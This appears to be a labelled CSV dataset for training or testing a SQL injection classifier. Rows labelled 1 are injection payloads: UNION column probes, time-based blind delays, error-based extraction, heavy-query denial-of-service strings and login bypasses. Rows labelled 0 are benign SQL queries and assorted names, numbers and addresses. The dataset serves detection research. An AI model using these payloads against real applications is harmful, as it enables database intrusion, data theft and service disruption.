Query,Label
"-2460%""  )   or   (  2660  =  5767  )  *5767 and   (  ""%""  =  """,1
"  SELECT Orders.seriesrID, Employees.leg, Employees.serve FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.trainID ORDER BY Orders.briefID",0
"1""   )    )    waitfor delay '0:0:5'--",1
SELECT * FROM now WHERE process = 'treated' LIMIT 3,0
SELECT * FROM cage WHERE carbon LIKE '%pen%',0
SELECT * FROM day WHERE out = 'function',0
"1  )   as udjn where 6871  =  6871 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
1 and 8398  =  1891-- naov,1
5296,0
SELECT * FROM apple WHERE phrase BETWEEN 'wonder' AND 'practical',0
SELECT test ( s )  FROM desert SELECT mysterious FROM sides,0
"1   )    )    as bwrg where 3254  =  3254 union all select null,null,null,null,null,null--",1
1'||  (  select 'puco' where 2605  =  2605 union all select null#,1
"-2453""  )   union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520--",1
"-2962'   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'hkjo'  =  'hkjo",1
"1""   )    )    as itxo where 7916  =  7916",1
thompson,0
78595518x,0
darns cabrianes,0
-9389'  )   order by 1#,1
SELECT mountain ( s )  FROM shoe SELECT believed ( s ) ,0
"1   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   7200  =  7200",1
"1   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
SELECT AVG ( load ) FROM arrange,0
"  UPDATE gun SET hungry =  'chair', City =  'screen' WHERE slow =  melted",0
"-7776'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ihof'  =  'ihof",1
"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",1
"   SELECT tip, half, drivingFROM physical WHERE usual  IS NOT NULL",0
"1"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""xyjg""  =  ""xyjg",1
SELECT * FROM doubt,0
" SELECT * FROM cookies ORDER BY cut ASC, great DESC",0
"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",1
SELECT COUNT ( DISTINCT appropriate )  FROM completely,0
96616229z,0
liesemer,0
darcange1,0
promanar,0
SELECT * FROM middle WHERE sound LIKE '%plain%',0
DELETE FROM nose,0
"1""  )   where 5850  =  5850 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1
SELECT COUNT ( whenID ) FROM rubbed,0
"   SELECT fur, electric, person FROM felt WHERE president  IS NULL",0
"-4925"" union all select 5686,5686,5686,5686,5686,5686,5686#",1
"1%"" and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
 or 1  =  1 /*,1
" SELECT column_name ( s )  FROM natural,brother",0
"1   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2952  =  2952",1
cuarter8da,0
SELECT * FROM zero FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM mirror,0
SELECT AVG ( instrument )  FROM construction  SELECT SUM ( finally ) ,0
SELECT TOP 50 PERCENT * FROM busy,0
SELECT * FROM fed WHERE speech NOT LIKE 'forgot%',0
"-7743"" or 9323  =  9323#",1
"1   )    )    as xovu where 4530  =  4530 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT * FROM getting WHERE tide NOT LIKE '[shop]%',0
tilden.auerbach4@cochesautomaticos.ru,0
-5113'   )    )     )   or 7200  =  3094--,1
yuncos,0
c0m51ar,0
1' where 8770  =  8770 union all select null--,1
-9742  )   where 8409  =  8409 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
SELECT volume ( s )  FROM wealth LEFT JOIN,0
"1""   )    )    and 9198  =  9198--",1
1'  )   as mpsf where 3348  =  3348,1
SELECT bound ( s )  FROM teeth UNION,0
1 where 1519  =  1519,1
SELECT * FROM key WHERE suit = 'teach' LIMIT 3,0
" SELECT * FROM own ORDER BY highest, improve",0
SELECT * FROM language WHERE circus NOT LIKE '[declared]%',0
"1%' or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
1%'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   '%'  =  ',1
"1'||  (  select 'xuof' from dual where 8794  =  8794 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
" SELECT * FROM stand ORDER BY equipment, from",0
"-9922'   )    )    union all select 2193,2193,2193--",1
1'  )   rlike   (  select   (  case when   (  7447  =  3981  )   then 1 else 0x28 end   )    ) ,1
atl-sale,0
"  UPDATE very SET anywhere =  'pressure', City =  'couple' WHERE pay =  but",0
aimarsen@enla.gi,0
" SELECT column_name ( s )  FROM difference,damage",0
jo,0
SELECT * FROM rice WHERE Price NOT BETWEEN 10 AND 20,0
"-6368' union all select 6529,6529,6529--",1
"plza. luis cernuda, 88",0
SELECT * FROM eight FETCH FIRST 50 PERCENT ROWS ONLY,0
fuente el saz de jarama,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c830bdbb26' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
SELECT hurried ( s ) FROM saw INNER JOIN,0
SELECT president FROM any UNION ALL SELECT this FROM sunlight ORDER BY driver,0
25769,0
-8860  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1
SELECT * FROM soon WHERE frozen NOT BETWEEN 'remember' AND 'has',0
5.7678E+14,0
guindo vive,0
SELECT * FROM buffalo WHERE rest BETWEEN person09/01/1996meat AND touch15/31/1996copy,0
SELECT * FROM positive FETCH FIRST 50 PERCENT ROWS ONLY,0
"  SELECT fruitID AS ID, aware AS select FROM society",0
"1%' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and '%'  =  '",1
SELECT differ ( s FROM unit RIGHT JOIN,0
#NAME?,0
7576,0
1  )   as nxmd where 8650  =  8650,1
hiromi,0
1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- izad,1
SELECT AVG ( second ) FROM hill SELECT SUM ( brother ) ,0
"1"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and ""xmvr""  =  ""xmvr",1
SELECT * FROM dirty WHERE fellow  BETWEEN 10 AND 20,0
"1%""  )   or sleep  (  5  )   and   (  ""%""  =  """,1
trixy,0
SELECT AVG ( Price ) FROM chapter,0
48825670m,0
50212,0
SELECT * FROM sink  WHERE steel = now,0
"-3037  )   where 9024  =  9024 union all select 9024,9024--",1
"SELECT wp_posts.ID FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id AND wp_postmeta.meta_key  =  'fave_agent_visible'  )  LEFT JOIN wp_postmeta AS mt1 ON  (  wp_posts.ID  =  mt1.post_id  )  WHERE 1 = 1 AND  (  wp_postmeta.post_id IS NULL OR  (  mt1.meta_key  =  'fave_agent_visible' AND CAST ( mt1.meta_value AS SIGNED )  ! =  '1'  )   )  AND wp_posts.post_type  =  'houzez_agent' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_date ASC LIMIT 0, 2",0
07383536f,0
SELECT * FROM mass WHERE ocean = 'syllable'  AND City = 'characteristic',0
9903rti37,0
"  SELECT Orders.mostrID, Employees.plenty, Employees.herself FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.summerID ORDER BY Orders.fairlyID",0
" select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",1
-3458'  )   where 2053  =  2053 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
"1""   )    )    as pafp where 6770  =  6770 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
9.47299E+15,0
SELECT main,0
SELECT * FROM  ( SELECT anybody FROM lying ) ,0
milly7,0
SELECT * FROM sudden WHERE pig = 'pile'  OR hand = 'mix',0
SELECT * FROM art WHERE physical = 'dropped' LIMIT 3,0
"1'   )    )     )   union all select null,null#",1
"   SELECT important, kill, whyFROM snow WHERE creature  IS NOT NULL",0
"1  )   where 5073  =  5073 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""rphs""  =  ""rphs",1
"-7601""   )    )     )   union all select 1293,1293,1293,1293,1293,1293,1293,1293--",1
33418,0
" SELECT o.OrderID, o.OrderDate, c.CustomerName FROM Customers AS c, Orders AS o WHERE c.CustomerName = ""Around the Horn"" AND c.CustomerID = o.CustomerID;",0
cel65co,0
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1
SELECT COUNT ( DISTINCT environment )  FROM metal,0
mieza,0
"  SELECT Orders.musicalrID, Employees.figure, Employees.between FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.forgetID ORDER BY Orders.circusID",0
SELECT * FROM principle,0
 (  s,1
SELECT * FROM mainly,0
"INSERT INTO underline  ( herself, dull, social )  VALUES  ( 'book', 'dry', 'entire' )  ",0
de asbaje abarzuza,0
"1'||  (  select 'ukfj' where 7133  =  7133 union all select null,null,null#",1
"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",1
"calle calderon de la barca, 141",0
" SELECT column_name ( s )  FROM curious,bus",0
"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1
"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'ppwh'  =  'ppwh",1
"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",1
"  SELECT * FROM task WHERE every NOT IN  ( 'sides', 'typical', 'headed' )  ",0
SELECT * FROM disappear WHERE ago BETWEEN 'square' AND 'powerful',0
-4538'   )    )     )   or 3260  =  1236 and    (    (     (  'hpnd' like 'hpnd,1
velov@expozaragozafloral2014.ac,0
SELECT * FROM maybe FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM mind,0
SELECT DISTINCT duty FROM damage,0
SELECT * FROM beginning,0
diana,0
1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,1
admin' #,1
"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",1
1%'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   '%'  =  ',1
SELECT * FROM driver,0
SELECT * FROM class WHERE make  BETWEEN 10 AND 20,0
SELECT * FROM production FETCH FIRST 50 PERCENT ROWS ONLY,0
" select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",1
"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""mjkl""  =  ""mjkl",1
end and    (    (     (  'ycte'  =  'ycte,1
SELECT * FROM sheet WHERE pool = 'remarkable' LIMIT 3,0
"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1
1   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
-7452 where 2224  =  2224 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
"1,  (  case when 2872  =  2872 then 1 else null end  )  ",1
1' where 4253  =  4253,1
"INSERT INTO trip  ( slight, organized, duck )  VALUES  ( 'made', 'previous', 'gather' )  ",0
SELECT * FROM sugar WHERE south BETWEEN '1996-07-01' AND '1996-07-31',0
"1%' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and '%'  =  '",1
"  SELECT blueID AS ID, seven AS classroom FROM acres",0
58193627q,0
"1'  )   where 6081  =  6081 union all select null,null,null,null,null,null,null,null,null--",1
SELECT TOP 50 PERCENT * FROM instant SELECT * FROM managed FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM nine,0
" SELECT * FROM sides ORDER BY problem ASC, hunt DESC",0
canosa,0
"1'||  (  select 'wgte' from dual where 6316  =  6316 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",1
"-5891  )   where 5792  =  5792 union all select 5792,5792,5792,5792,5792#",1
11690,0
prell@davidymamen.tc,0
SELECT * FROM wait WHERE moon = 'clearly',0
piols padilla,0
" SELECT * FROM egg ORDER BY clothing, cheese",0
1'+  (  select 'mdxt' where 2733  =  2733 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
"1' where 8837  =  8837 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
0utaperc09,0
SELECT * FROM ran WHERE element NOT LIKE '[spell]%',0
"1   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   9270  =  9270",1
"   SELECT zulu, wise, poor FROM poor WHERE with  IS NULL",0
"ametlla de mar, l'",0
"1""   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   ""xjdh""  =  ""xjdh",1
"1   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   8294  =  8294",1
naca39,0
afkham,0
"1%""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
1  )   as hhly where 2906  =  2906,1
cojera,0
"  SELECT IF ( STRCMP ( ""hello"",""bye"" )   =  0, ""YES"", ""NO"" ) ;",0
SELECT * FROM country FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM section,0
SELECT * FROM additional WHERE writing NOT BETWEEN 'any' AND 'peace',0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 239186 )  ORDER BY meta_id ASC",0
SELECT * FROM since WHERE think BETWEEN 'friend' AND 'gradually',0
clodettes_pierson@repretexbcn.ml,0
5.96812E+15,0
"1""  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28620 )  ORDER BY meta_id ASC",0
1' in boolean mode  )   union all select null--,1
tanglao,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'hmqd'  =  'hmqd",1
"1""  )   as obbk where 6414  =  6414 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
garantir,0
SELECT individual ( s )  FROM troops FULL OUTER JOIN,0
1'||  (  select 'xdzp' from dual where 5786  =  5786 and   (  3020  =  3020  )  *6703  )  ||',1
desnudez,0
SELECT * FROM spider WHERE    NOT vessels = 'oxygen',0
"  SELECT spread AS plant, tears AS [mile]  FROM month",0
"SELECT * FROM whom WHERE wait BETWEEN ""adventure"" AND    ""brave""",0
6.67245E+15,0
end and   (  'nchh'  =  'nchh,1
SELECT * FROM children 3 SELECT * FROM desert,0
1'   )    )    as zari where 6847  =  6847,1
SELECT AVG ( say ) FROM shirt SELECT SUM ( desert ) ,0
"-7306"" or 2081  =  6847",1
"  SELECT sheet,human FROM lunch WHERE apartment = 'unless' UNION SELECT accurate, coat FROM unknown",0
0x730065006c0065006300740020004000400076006500 ...,1
"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
"   SELECT COUNT ( roll ) , field FROM die BY are",0
"1""   )    )    as vigs where 6175  =  6175 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
orejana,0
60928646j,0
" select * from users where id  =  1 or @#"".  =  1 or 1  =  1 -- 1",1
SELECT * FROM thus 3,0
SELECT * FROM neighborhood FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cause,0
"1"" where 5098  =  5098 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1
SELECT TOP 3 * FROM goose WHERE nearest = 'doubt' SELECT * FROM neighborhood,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 3946 )  ORDER BY meta_id ASC",0
SELECT * FROM hung WHERE already = 'greatest'  AND  ( sun = 'ahead' OR characteristic = 'one' ) ,0
robledo,0
SELECT * FROM alone WHERE wind BETWEEN correctly09/01/1996window AND been15/31/1996garden,0
SELECT * FROM anyone WHERE tired = 'fairly',0
8.71176E+15,0
"  SELECT circusID AS ID, suit AS rope FROM mile",0
DELETE FROM explain WHERE development = 'is',0
SELECT * FROM studied  WHERE edge = bow,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c82a3dbb22' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
SELECT camp ( s )  FROM chose UNION,0
22367,0
SELECT invented ( s )  FROM pool UNION,0
46838,0
-2039'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1
1.13313E+15,0
SELECT principal ( s )  FROM pocket FULL OUTER JOIN,0
"1   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"-7543'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
vilagut victori,0
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1
vaquer gorigoitia,0
SELECT * FROM guard WHERE children NOT LIKE '[seldom]%',0
SELECT * FROM managed WHERE away = 'married'  OR valuable = 'grandfather',0
-6586'   )    )    or 2021  =  2996,1
SELECT globe ( s )  FROM shirt UNION ALL,0
SELECT * FROM soap FETCH FIRST 50 PERCENT ROWS ONLY,0
"1',iif  (  6625  =  6625,1,1/0  )  ",1
50227,0
SELECT * FROM exact WHERE consist NOT BETWEEN 'political' AND 'introduced',0
9193,0
SELECT MIN ( Price )  AS   SmallestPrice FROM Products;,0
SELECT * FROM attached WHERE owner NOT LIKE '[blue]%',0
SELECT * FROM  ( SELECT shake FROM tea ) ,0
1zu67rado,0
qunola,0
9.8156E+14,0
SELECT population ( s ) FROM star INNER JOIN,0
"1"" where 5477  =  5477",1
SELECT * FROM vote 3,0
SELECT * FROM sea WHERE being = 'sugar' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM invented ORDER BY finger,0
"1""  )   where 3445  =  3445 and elt  (  1212  =  1254,1254  )  --",1
SELECT Count ( * )  AS column,0
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'dqoz' like 'dqoz,1
ajmet,0
SELECT AVG ( sink ) FROM outline SELECT SUM ( neighborhood ) ,0
47172,0
SELECT COUNT ( air ) FROM attempt,0
"  SELECT PERIOD_DIFF ( 201710, 201703 ) ;",0
romeralo pers,0
c/ alcazalquivir s/n,0
1490,0
DELETE FROM slope,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null   )    )   +'",1
SELECT COUNT ( DISTINCT complete )  FROM fact,0
SELECT * FROM function WHERE society NOT LIKE '[bad]%',0
1  )   where 3671  =  3671,1
